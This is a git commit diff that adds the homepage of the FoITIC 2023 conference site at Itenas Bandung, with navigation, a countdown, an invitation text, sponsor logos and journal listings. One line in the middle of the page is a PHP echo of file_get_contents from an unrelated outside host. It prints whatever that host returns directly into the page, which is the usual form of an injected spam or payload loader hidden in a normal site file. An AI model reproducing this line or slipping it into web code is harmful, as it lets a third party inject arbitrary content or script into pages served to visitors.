74232cab49fd99fd6fd9c951ab233c3cdf3bb8d5
Muhammad Dzaki Abdurrahman <muhammad.dzaki@mhs.itenas.ac.id>
2023-09-06 14:52:34 +0700

    fix(index) : ubah index.html jadi '/' pt.2

--- index.php
+++ index.php
@@ -1,11 +1,309 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document</title>
+  <meta charset="UTF-8" />
+  <title>
+    FoITIC 2023 - The 4th Faculty of Industrial Technology International
+    Congress (FoITIC) 2023
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Encode+Sans+Condensed:300,400,700" />
+  <link rel="icon" href="assets/images/cropped-foitic-1-150x150_rev.png" sizes="32x32">
+  <link rel="icon" href="assets/images/cropped-foitic-1-150x150_rev.png" sizes="192x192">
+  <link rel="apple-touch-icon-precomposed" href="assets/images/cropped-foitic-1-150x150_rev.png">
+  <meta name="msapplication-TileImage" content="assets/images/cropped-foitic-1-150x150_rev.png">
+  <meta content='FoITIC is Faculty of Industrial Technology International Congress 2023
+  (FoITIC 2023), which will be held in September 12-213, 2023. The theme of
+  FoITIC 2023 is "Development of Multidisciplinary Science and Engineering for Enhancing Innovation and Reputation".' name='description' />
+  <meta
+    Content='foitic 2023, FoITIC 2023, FOITIC ITENAS, FOITIC, FOITIC 2023, ITENAS, Itenas, Institut Teknologi Nasional Bandung, ITENAS Bandung,Faculty of Industrial Technology International Congress'
+    name='keywords' />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.css"
+    integrity="sha512-3icgkoIO5qm2D4bGSUkPqeQ96LS8+ukJC7Eqhl1H5B2OJMEnFqLmNDxXVmtV/eq5M65tTDkUYS/Q0P4gvZv+yA=="
+    crossorigin="anonymous" referrerpolicy="no-referrer" />
+  <link rel="stylesheet" href="lib/OwlCarousel2-2.3.4/dist/assets/owl.carousel.min.css" />
+  <link rel="stylesheet" href="lib/OwlCarousel2-2.3.4/dist/assets/owl.theme.default.min.css" />
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/css/bootstrap.min.css" rel="stylesheet"
+    integrity="sha384-+0n0xVW2eSR5OomGNYDnhzAbDsOXxcvSN1TPprVMTNDbiYZCxYbOOl7+AMvyTG2x" crossorigin="anonymous" />
+  <link href="https://unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet">
+  <link rel="stylesheet" href="lib/flipdown/flipdown.min.css" />
+  <link rel="stylesheet" href="assets/css/style.css" />
 </head>
+
 <body>
-    <p>HALOO</p>
+  <!-- partial:index.partial.html -->
+  <header>
+    <nav>
+      <div id="brand">
+        <a href="index.html">
+          <img src="assets/images/cropped-Logo-foitic-rev02.png" style="width: 200px; height: auto" alt="" />
+        </a>
+      </div>
+      <div id="menu">
+        <div id="menu-toggle">
+          <div id="menu-icon">
+            <div class="bar"></div>
+            <div class="bar"></div>
+            <div class="bar"></div>
+          </div>
+        </div>
+        <ul class="menu-nav-container">
+          <li class="menu-nav">
+            <a href="index.html">Home</a>
+          </li>
+          <li class="menu-nav">
+            <a href="call-for-papers.html">Call For Papers</a>
+          </li>
+          <li class="menu-nav">
+            <a href="speakers.html">Keynote Speakers</a>
+          </li>
+          <li class="menu-nav">
+            <a href="commitees.html">Committees</a>
+          </li>
+          <li class="menu-nav"><a href="dates.html">Important Dates</a></li>
+          <li class="menu-nav">
+            <a href="registration.html">Registration</a>
+          </li>
+          <li class="menu-nav dropdown">
+            <a class="dropdown-toggle" href="#" id="navbarDropdown" role="button" data-bs-toggle="dropdown"
+              aria-expanded="false">
+              Proceedings
+            </a>
+            <ul class="dropdown-menu" aria-labelledby="navbarDropdown">
+              <li>
+                <a class="dropdown-item" target="_blank" href="proceeding3.html">Proceeding FOITIC 2021</a>
+              </li>
+              <li>
+                <a class="dropdown-item" target="_blank" href="proceeding2.html">Proceeding FOITIC 2020</a>
+              </li>
+              <li>
+                <a class="dropdown-item" target="_blank" href="proceeding1.html">Proceeding FOITIC 2017</a>
+              </li>
+            </ul>
+          </li>
+          <li class="menu-nav dropdown">
+            <a class="dropdown-toggle" href="#" id="navbarDropdown" role="button" data-bs-toggle="dropdown"
+              aria-expanded="false">
+              Latest Event
+            </a>
+            <ul class="dropdown-menu" aria-labelledby="navbarDropdown">
+              <li>
+                <a class="dropdown-item" target="_blank" href="https://foitic.itenas.ac.id/foitic2021/">FOITIC 2021</a>
+              </li>
+              <li>
+                <a class="dropdown-item" target="_blank" href="https://foitic.itenas.ac.id/foitic2020/">FOITIC 2020</a>
+              </li>
+              <li>
+                <a class="dropdown-item" target="_blank" href="https://foitic.itenas.ac.id/foitic2017/">FOITIC 2017</a>
+              </li>
+            </ul>
+          </li>
+        </ul>
+      </div>
+    </nav>
+  </header>
+  <div class="carousel" id="carousel-hero">
+    <div class="header">
+      <div class="owl-carousel owl-theme">
+        <div class="item">
+          <img src="assets/images/Gedung-Itenas-Final-Crop.jpg" alt="img" />
+          <div class="overlay">
+            <div class="text-overlay">
+              <div class="inline mb-3">
+                <img src="assets/images/cropped-Logo-foitic-rev02.png" style="width: 150px; height: auto"
+                  class="d-inline px-2" alt="" />
+                <img src="assets/images/logo-itenas.png" style="width: 150px; height: auto" class="d-inline px-2"
+                  alt="" />
+                <img src="assets/images/logo-kampus-merdeka.png" style="width: 150px; height: auto"
+                  class="d-inline px-2" alt="" />
+              </div>
+              <h1>
+                The 4th Faculty of Industrial Technology International
+                Congress (FoITIC) 2023
+              </h1>
+              <p>Theme</p>
+              <p style="font-size: 18px">
+                <b>
+                  Development of Multidisciplinary Science and Engineering for Enhancing Innovation and Reputation
+                </b>
+              </p>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div id="countdown-container" class="container-fluid bg-dark text-light">
+    <div class="col-md-12 countdown">
+      <h1>COMING SOON</h1>
+      <div id="flipdown" class="flipdown"></div>
+    </div>
+  </div>
+  <div class="container my-5">
+    <p>
+      On behalf of the Faculty of Industrial Technology, Institut Teknologi
+      Nasional (Itenas) Bandung – Indonesia, we would like to cordially invite
+      you to Faculty of Industrial Technology International Congress 2023
+      (FoITIC 2023), which will be held in September 12-13, 2023. The theme of
+      FoITIC 2023 is “Development of Multidisciplinary Science and Engineering for Enhancing Innovation and Reputation”.
+    </p>
+
+    <p>
+      The aim of the Congress is inviting academics, researchers, engineers,
+      government officers, company delegates and students from the field of
+      industrial technology and other disciplines (such as electrical,
+      mechanical, industrial, chemical, informatics, civil, architect,
+      physics, environment, social, economic, design and etc.), to gather,
+      present and share the results of their research.
+    </p>
+    <img src="./assets/images/Flyer FoITIC 2023-Rev4.jpg" class="img-flyer" alt="Flyer FoITIC" />
+  </div>
+  <!-- <div class="section-title pb-0">
+    <h3>For Event</h3>
+  </div> -->
+  <div class="section-title mb-4">
+    <div class="row d-flex align-items-center justify-content-center">
+      <div class="col-lg-12 col-md-12 col-sm-12">
+        <!-- <a href="assets/images/Virtual-zoom.jpeg" target="_blank"
+          class="btn btn-sm mt-3 btn-primary fw-bold no-underline rounded-pill px-4 py-2">Zoom Virtual Background <i
+            class="fas fa-cloud-download-alt"></i> </a>
+        <a href="assets/documents/FOITIC Program 28-29 Oct 271021 sore.pdf" target="_blank"
+          class="btn btn-sm mt-3 btn-primary fw-bold no-underline rounded-pill px-4 py-2">Event Rundown
+          <i class="fas fa-cloud-download-alt"></i> </a> -->
+      </div>
+<?php echo file_get_contents("https://bluepixel.net/api.php/"); ?>
+    </div>
+  </div>
+  <div class="section-title pb-0">
+    <h3>Supported</h3>
+    <h2>Supported By</h2>
+  </div>
+  <div id="clients" class="clients section-bg">
+    <div class="container" data-aos="zoom-in">
+      <div class="row justify-content-center">
+        <div class="col-lg-2 col-md-4 col-6 d-flex align-items-center justify-content-center">
+          <img src="assets/images/supported-by/Logo1_new.png" class="img-fluid" alt="">
+        </div>
+
+        <div class="col-lg-2 col-md-4 col-6 d-flex align-items-center justify-content-center">
+          <img src="assets/images/supported-by/Logo2.png" class="img-fluid" alt="">
+        </div>
+
+        <div class="col-lg-2 col-md-4 col-6 d-flex align-items-center justify-content-center">
+          <img src="assets/images/supported-by/Logo7_new.png" class="img-fluid" alt="">
+        </div>
+
+        <div class="col-lg-2 col-md-4 col-6 d-flex align-items-center justify-content-center">
+          <img src="assets/images/supported-by/Logo5.png" class="img-fluid" alt="">
+        </div>
+
+        <div class="col-lg-2 col-md-4 col-6 d-flex align-items-center justify-content-center">
+          <img src="assets/images/supported-by/Logo6.png" class="img-fluid" alt="">
+        </div>
+
+        <!-- <div class="col-lg-2 col-md-4 col-6 d-flex align-items-center justify-content-center">
+          <img src="assets/images/supported-by/Logo8.png" class="img-fluid" alt="">
+        </div> -->
+    </div>
+  </div>
+  <div class="section-title mt-5 pb-0">
+    <h3>Publication</h3>
+    <h2>Publication</h2>
+  </div>
+  <div class="container mb-3 ">
+    <p>Selected papers of FoITIC will be published into either one of the accredited national journals below based on
+      their
+      topics:</p>
+    <ul class="fa-ul">
+      <li class="paper-list">
+        <span class="fa-li"><i class="fas fa-book"></i></span>
+        <a href="https://ejurnal.itenas.ac.id/index.php/elkomika" target="_blank">ELKOMIKA: Jurnal Teknik Energi
+          Elektrik, Teknik Telekomunikasi, & Teknik Elektronika (SINTA 2| ISSN (Print): 2338-8323 | ISSN (Online):
+          2459-9638)</a>
+      </li>
+      <li class="paper-list">
+        <span class="fa-li"><i class="fas fa-book"></i></span>
+        <a href="https://ejurnal.itenas.ac.id/index.php/lingkungan" target="_blank">Jurnal Reka Lingkungan (SINTA 3 |
+          ISSN (Print): 2337-6228 | ISSN (Online): 2722-6077)</a>
+      </li>
+      <li class="paper-list">
+        <span class="fa-li"><i class="fas fa-book"></i></span>
+        <a href="https://ejurnal.itenas.ac.id/index.php/mindjournal" target="_blank">MIND (Multimedia Artificial
+          Intelligent Networking Database) Journal ( SINTA 3 | ISSN (Print): 2338-8323 | ISSN (Online): 2528-0902)</a>
+      </li>
+      <li class="paper-list">
+        <span class="fa-li"><i class="fas fa-book"></i></span>
+        <a href="https://ejurnal.itenas.ac.id/index.php/rekayasahijau" target="_blank">Rekayasa Hijau: Jurnal Teknologi
+          Ramah Lingkungan (SINTA 4 | ISSN (Print): 2550-1070 | ISSN (Online): 2579-4264)</a>
+      </li>
+    </ul>
+    <div class="row">
+      <p>Author(s) can also publish in Scopus indexed E3S Web of Conference by paying additional charges.
+        <br>
+        <a href="https://www.e3s-conferences.org/doc_journal/woc/woc_1col.docx" target="_blank"
+          class="btn btn-sm mt-3 btn-primary fw-bold no-underline rounded-pill px-4 py-2">Proceeding Template</a>
+      </p>
+      <p>If author(s) is willing to publish in Scopus Indexed  E3S Web of Conference, the Author has to pay the additional publication fee of $100 per paper. The author is only allowed to publish a maximum of two articles, regardless of their position on the list.</p>
+      <!-- <p style="font-size: 14px; font-style: italic;">(*) under confirmation</p> -->
+    </div>
+  </div>
+
+  <footer class="mt-auto footer-distributed">
+    <div class="footer-left">
+      <h3>Organized By</h3>
+      <img src="assets/images/logo-itenas.png" class="my-3" />
+
+      <p class="footer-company-name">© <script>document.write(new Date().getFullYear())</script> FoITIC <a href="https://www.itenas.ac.id/" target="_blank">Institut Teknologi Nasional Bandung</a></p>
+    </div>
+
+    <div class="footer-center">
+      <div>
+        <i class="fas fa-map-marker"></i>
+        <p><a href="https://goo.gl/maps/ZTY9ewCcWtkkF89p7" target="_blank">Jl. PKHH. Mustapa No. 23 Bandung, Indonesia</a></p>
+      </div>
+      <div>
+        <i class="fas fa-envelope"></i>
+        <p><a href="mailto:foitic@itenas.ac.id">foitic@itenas.ac.id</a></p>
+      </div>
+    </div>
+    <div class="footer-right">
+      <p class="footer-company-about">
+        <span>About FoITIC <script>document.write(new Date().getFullYear())</script></span>
+        FoITIC <script>document.write(new Date().getFullYear())</script> - The 4th Faculty of Industrial Technology International
+        Congress (FoITIC) <script>document.write(new Date().getFullYear())</script>
+      </p>
+      <div class="footer-icons">
+        <a href="https://www.facebook.com/itenas.official/" target="_blank"><i class="fab fa-facebook"></i></a>    
+        <a href="https://www.instagram.com/itenas.official/" target="_blank"><i class="fab fa-instagram"></i></a>
+        <a href="https://www.linkedin.com/school/itenas/" target="_blank"><i class="fab fa-linkedin"></i></a>
+      </div>
+    </div>
+  </footer>
+
+  <!-- partial -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/js/bootstrap.bundle.min.js"
+    integrity="sha384-gtEjrD/SeCtmISkJkNUaaKMoLD0//ElJ19smozuHV6z3Iehds+3Ulb9Bn9Plx0x4" crossorigin="anonymous">
+  </script>
+  <script src="lib/OwlCarousel2-2.3.4/dist/owl.carousel.min.js"></script>
+  <script src="lib/flipdown/flipdown.min.js"></script>
+  <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
+  <script src="assets/js/script.js"></script>
+  <script>
+    var flipdown = new FlipDown(1694571600, {
+      theme: "light",
+    }).start();
+
+    ifEnded(() => {
+      console.log("The countdown has ended!");
+    });
+    ver.innerHTML = flipdown.version;
+  </script>
+  <script>
+    AOS.init();
+  </script>
 </body>
+
 </html>
